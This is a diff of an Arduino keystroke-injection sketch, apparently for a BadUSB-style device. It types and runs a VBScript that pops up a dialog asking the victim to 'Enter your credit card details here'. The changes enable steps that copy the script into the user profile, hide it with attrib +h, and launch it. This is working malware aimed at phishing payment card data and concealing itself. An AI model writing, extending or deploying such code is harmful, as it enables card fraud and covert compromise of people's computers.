@@ -50,8 +50,6 @@ void setup()
   typeKey(KEY_RETURN);
   delay(20);
   Keyboard.print("a = InputBox(");
-
-  
   Keyboard.print(F("\""));
   Keyboard.print("Enter your credit card details here:");
   Keyboard.print(F("\""));
@@ -59,7 +57,6 @@ void setup()
   Keyboard.print(F("\""));
   Keyboard.print("CreditCard");
   Keyboard.print(F("\""));
-
   Keyboard.print(",,randx,randy)"); 
   typeKey(KEY_RETURN);
   delay(20);
@@ -81,11 +78,11 @@ void setup()
   Keyboard.releaseAll();
   typeKey(KEY_RETURN);
   delay(50);
-  /*Keyboard.print("copy ");
+  Keyboard.print("copy ");
   Keyboard.print(F("\""));
   Keyboard.print("%USERPROFILE%");
   Keyboard.print(F("\\"));
-  Keyboard.print("System.vbs");
+  Keyboard.print("CreditCard.vbs");
   Keyboard.print(F("\""));
   Keyboard.print(" ");
   Keyboard.print(F("\""));
@@ -99,9 +96,9 @@ void setup()
   Keyboard.print(F("\""));
   typeKey(KEY_RETURN); 
   delay(50); 
-  Keyboard.print("attrib +h System.vbs");
+  Keyboard.print("attrib +h CreditCard.vbs");
   typeKey(KEY_RETURN); 
-  delay(50); */
+  delay(50); 
   Keyboard.print("start CreditCard.vbs && exit");
   typeKey(KEY_RETURN);
 }
